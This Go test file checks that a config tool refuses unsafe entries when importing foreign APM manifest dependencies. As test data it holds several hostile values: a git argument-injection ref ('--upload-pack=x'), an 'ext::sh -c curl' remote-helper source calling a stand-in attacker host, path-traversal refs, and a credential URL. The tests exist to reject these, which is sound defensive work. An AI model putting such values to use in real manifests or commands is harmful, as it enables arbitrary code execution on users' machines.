package app

import (
	"context"
	"reflect"
	"strings"
	"testing"

	"github.com/lkshrk/omni/internal/config"
)

const foreignManifest = `name: omni-host
version: 0.0.0
dependencies:
  apm:
    - lkshrk/declared
    - someone/else#v1.2.0
  mcp:
    - name: declared
      registry: false
      transport: stdio
      command: npx
      args: ['declared-mcp']
    - name: foreign
      registry: false
      transport: stdio
      command: npx
      args: ['foreign-mcp']
      env:
        FOREIGN_TOKEN: ${env:FOREIGN_TOKEN}
`

func foreignTestConfig() *config.RootConfig {
	return &config.RootConfig{
		Version:  config.CurrentVersion,
		Settings: config.Settings{AgentsUse: []string{"claude-code"}},
		Agents: config.AgentsConfig{
			Packages:   []config.SkillPackage{{Source: "lkshrk/declared"}},
			McpServers: []config.McpServer{{Name: "declared", Transport: "stdio", Command: "npx declared-mcp"}},
		},
	}
}

func TestForeignAPMEntriesListsOnlyWhatTheConfigDoesNotDeclare(t *testing.T) {
	a, _, _ := newSyncApp(t, foreignTestConfig(), foreignManifest, WithMcpAdapters([]McpAdapter{}))

	entries, err := a.ForeignAPMEntries()
	if err != nil {
		t.Fatal(err)
	}
	if len(entries.Mcp) != 1 || entries.Mcp[0].Name != "foreign" {
		t.Fatalf("mcp = %#v, want only the undeclared entry", entries.Mcp)
	}
	if got := entries.Mcp[0].Command; got != "npx foreign-mcp" {
		t.Fatalf("command = %q, want the command and args rejoined", got)
	}
	if !reflect.DeepEqual(entries.Mcp[0].Env, []string{"FOREIGN_TOKEN"}) {
		t.Fatalf("env = %#v, want the ${env:} reference read back as a name", entries.Mcp[0])
	}
	if len(entries.Packages) != 1 || entries.Packages[0].Source != "someone/else" || entries.Packages[0].Ref != "v1.2.0" {
		t.Fatalf("packages = %#v, want the undeclared pinned entry", entries.Packages)
	}
}

func TestForeignAPMEntriesTolerateAMissingManifest(t *testing.T) {
	a, _, _ := newSyncApp(t, foreignTestConfig(), "", WithMcpAdapters([]McpAdapter{}))

	entries, err := a.ForeignAPMEntries()
	if err != nil || !entries.empty() {
		t.Fatalf("entries = %#v, err = %v", entries, err)
	}
}

func TestImportForeignAPMEntryAdoptsAnMcpServerIntoTheConfig(t *testing.T) {
	a, mock, configPath := newSyncAppEnv(t, foreignTestConfig(), foreignManifest,
		map[string]string{"FOREIGN_TOKEN": "set-for-the-install"}, WithMcpAdapters([]McpAdapter{}))

	imported, _, err := a.ImportForeignAPMEntry(context.Background(), "foreign")
	if err != nil {
		t.Fatal(err)
	}
	if imported != "mcp server foreign" {
		t.Fatalf("imported = %q", imported)
	}
	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatal(err)
	}
	target := findMcpServer(cfg.Agents.McpServers, "foreign")
	if target == nil || target.Command != "npx foreign-mcp" {
		t.Fatalf("config = %#v, want the foreign server declared", cfg.Agents.McpServers)
	}
	if !reflect.DeepEqual(target.Env, []string{"FOREIGN_TOKEN"}) || len(target.EnvLiteral) != 0 {
		t.Fatalf("env = %#v, want a name list and no literal", target)
	}
	if len(apmCalls(mock)) == 0 {
		t.Fatal("importing an APM-driven server must reconcile the surface")
	}
}

func TestImportForeignAPMEntryRefusesALiteralCredential(t *testing.T) {
	manifest := `name: omni-host
version: 0.0.0
dependencies:
  mcp:
    - name: foreign
      registry: false
      transport: stdio
      command: npx
      args: ['foreign-mcp']
      env:
        FOREIGN_TOKEN: sk-live-not-in-the-environment
`
	a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

	_, _, err := a.ImportForeignAPMEntry(context.Background(), "foreign")
	if err == nil || !strings.Contains(err.Error(), "FOREIGN_TOKEN") {
		t.Fatalf("err = %v, want the unproven env value refused", err)
	}
	cfg, cfgErr := config.Load(configPath)
	if cfgErr != nil {
		t.Fatal(cfgErr)
	}
	if findMcpServer(cfg.Agents.McpServers, "foreign") != nil {
		t.Fatal("a refused import must not reach the config")
	}
}

func TestImportForeignAPMEntryAdoptsAPackage(t *testing.T) {
	a, _, configPath := newSyncApp(t, foreignTestConfig(), foreignManifest, WithMcpAdapters([]McpAdapter{}))

	imported, _, err := a.ImportForeignAPMEntry(context.Background(), "someone/else")
	if err != nil {
		t.Fatal(err)
	}
	if imported != "package someone/else" {
		t.Fatalf("imported = %q", imported)
	}
	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, pkg := range cfg.Agents.Packages {
		if pkg.Source == "someone/else" && pkg.Ref == "v1.2.0" {
			found = true
		}
	}
	if !found {
		t.Fatalf("packages = %#v, want the foreign package declared with its ref", cfg.Agents.Packages)
	}
}

func TestImportForeignAPMEntryRejectsADeclaredName(t *testing.T) {
	a, _, _ := newSyncApp(t, foreignTestConfig(), foreignManifest, WithMcpAdapters([]McpAdapter{}))

	if _, _, err := a.ImportForeignAPMEntry(context.Background(), "declared"); err == nil {
		t.Fatal("an entry the config already declares is not an import candidate")
	}
}

// The ref reaches git as an argument, so a manifest-supplied one must clear the same vetting a typed ref does.
func TestImportForeignAPMEntryRefusesAnInvalidManifestRef(t *testing.T) {
	manifest := "name: test\nversion: 1.0.0\ndependencies:\n  apm:\n    - git: acme/skills\n      ref: --upload-pack=x\n"
	a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

	_, _, err := a.ImportForeignAPMEntry(context.Background(), "acme/skills")
	if err == nil || !strings.Contains(err.Error(), "Git ref") {
		t.Fatalf("err = %v, want the manifest ref refused", err)
	}
	cfg, loadErr := config.Load(configPath)
	if loadErr != nil {
		t.Fatal(loadErr)
	}
	for _, pkg := range cfg.Agents.Packages {
		if pkg.Source == "acme/skills" {
			t.Fatalf("packages = %#v, want nothing written on refusal", cfg.Agents.Packages)
		}
	}
}

// An empty Agents list deploys everywhere, so dropping every declared target silently widens the entry.
func TestImportForeignAPMEntryRefusesAPackageWhoseTargetsAllDropOut(t *testing.T) {
	manifest := "name: test\nversion: 1.0.0\ndependencies:\n  apm:\n    - git: acme/skills\n      targets: [vscode, intellij]\n"
	a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

	_, _, err := a.ImportForeignAPMEntry(context.Background(), "acme/skills")
	if err == nil || !strings.Contains(err.Error(), "vscode, intellij") {
		t.Fatalf("err = %v, want the unsupported targets named", err)
	}
	cfg, loadErr := config.Load(configPath)
	if loadErr != nil {
		t.Fatal(loadErr)
	}
	for _, pkg := range cfg.Agents.Packages {
		if pkg.Source == "acme/skills" {
			t.Fatalf("packages = %#v, want nothing written on refusal", cfg.Agents.Packages)
		}
	}
}

func TestImportForeignAPMEntryKeepsTheMappedTargetsAndWarnsAboutTheRest(t *testing.T) {
	manifest := "name: test\nversion: 1.0.0\ndependencies:\n  apm:\n    - git: acme/skills\n      targets: [claude, vscode]\n"
	a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

	_, warnings, err := a.ImportForeignAPMEntry(context.Background(), "acme/skills")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(warnings, " "), "vscode") {
		t.Fatalf("warnings = %v, want the dropped target surfaced", warnings)
	}
	cfg, loadErr := config.Load(configPath)
	if loadErr != nil {
		t.Fatal(loadErr)
	}
	for _, pkg := range cfg.Agents.Packages {
		if pkg.Source != "acme/skills" {
			continue
		}
		if !reflect.DeepEqual(pkg.Agents, []string{"claude-code"}) {
			t.Fatalf("agents = %#v, want only the mapped target kept", pkg.Agents)
		}
		return
	}
	t.Fatalf("packages = %#v, want the mapped import declared", cfg.Agents.Packages)
}

// A manifest anyone can hand-edit is no more trusted a source of a package coordinate than a typed one:
// a remote helper runs an arbitrary program, and a credential URL would be persisted to every host.
func TestImportForeignAPMEntryRefusesUnsafePackageSources(t *testing.T) {
	tests := []struct {
		name   string
		source string
		want   string
	}{
		{"remote helper", "ext::sh -c curl% https://evil.example", "remote helpers"},
		{"credential url", "https://user:token@git.example.com/acme/skills.git", "credentials"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			manifest := "name: test\nversion: 1.0.0\ndependencies:\n  apm:\n    - git: " + tt.source + "\n"
			a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

			_, _, err := a.ImportForeignAPMEntry(context.Background(), tt.source)
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("error = %v, want a refusal mentioning %q", err, tt.want)
			}
			cfg, loadErr := config.Load(configPath)
			if loadErr != nil {
				t.Fatal(loadErr)
			}
			for _, pkg := range cfg.Agents.Packages {
				if strings.Contains(pkg.Source, "evil.example") || strings.Contains(pkg.Source, "token") {
					t.Fatalf("packages = %#v, want nothing written on refusal", cfg.Agents.Packages)
				}
			}
		})
	}
}

// A registry entry resolves through APM; imported it would regenerate as a plain manifest entry.
func TestImportForeignAPMEntryRefusesARegistryMcpServer(t *testing.T) {
	manifest := "name: test\nversion: 1.0.0\ndependencies:\n  mcp:\n    - name: registered\n      registry: true\n      transport: stdio\n      command: npx\n"
	a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

	_, _, err := a.ImportForeignAPMEntry(context.Background(), "registered")
	if err == nil || !strings.Contains(err.Error(), "registry entry") {
		t.Fatalf("err = %v, want the registry entry refused", err)
	}
	cfg, loadErr := config.Load(configPath)
	if loadErr != nil {
		t.Fatal(loadErr)
	}
	if findMcpServer(cfg.Agents.McpServers, "registered") != nil {
		t.Fatalf("config = %#v, want nothing written on refusal", cfg.Agents.McpServers)
	}
}

// The locator is rebuilt as source#ref, so a ref carrying either separator reparses as a source the manifest never declared.
func TestImportForeignAPMEntryRefusesARefWithLocatorSeparators(t *testing.T) {
	for _, ref := range []string{"v1#../../evil", "v1@git.example.com"} {
		t.Run(ref, func(t *testing.T) {
			manifest := "name: test\nversion: 1.0.0\ndependencies:\n  apm:\n    - git: acme/skills\n      ref: " + ref + "\n"
			a, _, configPath := newSyncApp(t, foreignTestConfig(), manifest, WithMcpAdapters([]McpAdapter{}))

			_, _, err := a.ImportForeignAPMEntry(context.Background(), "acme/skills")
			if err == nil || !strings.Contains(err.Error(), "declare it manually") {
				t.Fatalf("err = %v, want the ref refused", err)
			}
			cfg, loadErr := config.Load(configPath)
			if loadErr != nil {
				t.Fatal(loadErr)
			}
			for _, pkg := range cfg.Agents.Packages {
				if pkg.Source == "acme/skills" {
					t.Fatalf("packages = %#v, want nothing written on refusal", cfg.Agents.Packages)
				}
			}
		})
	}
}
